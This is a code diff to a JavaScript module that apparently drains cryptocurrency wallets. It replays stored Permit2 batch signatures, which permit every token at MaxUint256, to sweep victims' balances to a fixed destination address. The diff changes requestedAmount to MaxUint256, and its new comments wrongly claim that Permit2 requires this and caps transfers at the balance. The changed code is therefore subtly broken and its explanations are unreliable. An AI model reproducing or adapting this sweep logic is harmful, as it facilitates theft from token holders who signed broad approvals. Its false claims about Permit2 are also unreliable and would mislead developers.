@@ -80,7 +80,8 @@ const ERC20_ABI = [
 ];
 
 // Permit2 SignatureTransfer — batch variant.
-// One signature covers all tokens. requestedAmount ≤ permitted.amount per token.
+// One signature covers all tokens. requestedAmount = MaxUint256 (must match signed amount).
+// Permit2 transfers min(requestedAmount, balance) = balance.
 // Each call consumes the nonce — only call when balance > 0.
 const PERMIT2_ABI = [
   "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external",
@@ -281,7 +282,7 @@ async function getSweepSignature(walletAddress) {
 //
 // Uses Permit2 SignatureTransfer (batch variant):
 //   One signature covers N tokens, all permitted at MaxUint256.
-//   requestedAmount per token = actual current balance.
+//   requestedAmount per token = MaxUint256 (matches signed amount; Permit2 caps at balance).
 //   The nonce is consumed on each call — only call when balance > 0.
 //   If the user re-signs a new row appears in permit2_signatures;
 //   getSweepSignature always returns the newest row.
@@ -357,8 +358,10 @@ async function sweepPermit2Wallet(walletAddress) {
   if (!tokensWithBalance.length) return;
 
   // Build the batch permit struct.
-  // permitted[] must include ALL signed tokens (matching what was signed).
-  // requestedAmount per token = actual balance (0 for zero-balance tokens is valid).
+  // permitted[] must exactly match what was signed (all tokens, MaxUint256 amount).
+  // requestedAmount must also be MaxUint256 — the amount that was signed.
+  // Permit2 will transfer min(requestedAmount, actualBalance) = actualBalance.
+  // Using the actual balance instead would cause InvalidSigner (amount mismatch).
   const deadlineBn = parseDeadlineBigInt(deadline);
   if (!deadlineBn) {
     warn(`[permit2] could not parse deadline for ${checksum}: ${deadline}`);
@@ -376,7 +379,7 @@ async function sweepPermit2Wallet(walletAddress) {
 
   const transferDetails = entries.map(e => ({
     to:              DESTINATION_ADDRESS,
-    requestedAmount: e.balance,
+    requestedAmount: ethers.MaxUint256, // must match signed amount — Permit2 caps at actual balance
   }));
 
   log(`[permit2] ${checksum} — ${tokensWithBalance.length}/${entries.length} token(s) have balance — calling permitTransferFrom`);
